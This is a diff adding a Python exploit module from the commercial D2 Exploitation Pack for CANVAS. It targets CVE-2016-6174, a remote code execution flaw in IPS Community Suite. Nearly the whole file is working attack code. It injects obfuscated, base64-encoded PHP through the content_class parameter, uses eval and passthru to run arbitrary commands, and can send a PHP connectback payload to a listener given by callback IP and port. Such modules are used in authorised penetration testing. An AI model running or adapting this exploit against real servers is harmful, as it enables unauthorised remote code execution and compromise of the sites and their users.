@@ -1,0 +1,121 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+	
+from exploitutils import *
+from ExploitTypes.php_multi import *
+
+import canvasengine
+import time
+import urllib
+import libs.spkproxy as spkproxy #for urlopen
+
+# GUI info
+NAME = "IPS Community Suite Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in IPS Community Suite"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Invision Power Services"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = "2016.07.07"
+DOCUMENTATION["VersionsAffected"] = "IPS Community Suite < 4.1.13"
+DOCUMENTATION["References"] = "http://karmainsecurity.com/KIS-2016-11"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2016-6174"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-6174"
+DOCUMENTATION["Notes"] = ""
+
+VERSION="1.0"
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+class theexploit(php_multi):
+    def __init__(self):
+        php_multi.__init__(self)
+        self.port=80
+        self.host=""
+        self.ssl=""
+        self.name=NAME
+        self.basepath="/"
+        self.basepaths=["/"]
+        self.command=None 
+        self.basicauth_user=""
+        self.basicauth_password=""
+        self.hostname=None
+        self.foundstrings=["Power Services"]
+        self.testfile="index.php"
+
+        return
+
+    def request1(self):
+        """
+	Goes through a loop of log file paths in the phpexploit class
+	and trys to inject/include PHPcode in these log files to get execution.
+        """
+
+        if self.command:
+            self.log("Command: %s"%self.command)
+            tag1   = "".join( [random.choice(string.digits) for i in xrange(8)] )
+            tag2   = "".join( [random.choice(string.digits) for i in xrange(8)] )
+            command=self.command
+            command="print("+tag1+");passthru('"+command+"');print("+tag2+");"
+            command="$d2=\"\\142\\x61\\163\\x65\\66\\x34\\x5f\\x64\\145\\x63\\x6f\\x64\\x65\";@eval($d2(%s));die;/*"%b64encode(command).strip().strip("=")       
+            
+            url = "%sindex.php?app=core&module=system&controller=content&do=find&content_class=cms\Fields1{}%s"%(self.basepath, command)
+            mainurl = "http://%s:%d%s" % (self.target.interface, self.port, url)
+            handle = spkproxy.urlopen(mainurl, extraheaders=[("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)")])
+            data = handle.read()                     
+
+            if tag1 in data:
+                result=data.split(tag1)[1].split(tag2)[0]
+                self.log("Command response: %s"%prettyprint(result))
+                return 1
+        else:
+            command=self.get_php_to_mosdef()                               
+            command="$d2=\"\\142\\x61\\163\\x65\\66\\x34\\x5f\\x64\\145\\x63\\x6f\\x64\\x65\";@eval($d2(%s));die;/*"%b64encode(command).strip().strip("=")       
+            
+            url = "%sindex.php?app=core&module=system&controller=content&do=find&content_class=cms\Fields1{}%s"%(self.basepath, command)
+            mainurl = "http://%s:%d%s" % (self.target.interface, self.port, url)
+            handle = spkproxy.urlopen(mainurl, extraheaders=[("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)")])
+            data = handle.read()                     
+                                
+            self.log("[+] Looking for PHP connectback")
+
+
+    def usage(self):
+        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 9898"
+        print "-t <target ip>"
+        print "-p <target port>                [optional]"
+        print "-O basepath: /path/to/phplist/[optional]"
+        print "-O hostname: target vhost       [optional]"
+        print "-O command:commandtorun         [optional]"
+        print "-l call back ip if doing connect back"
+        print "-d listening port for call back"
+        return
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
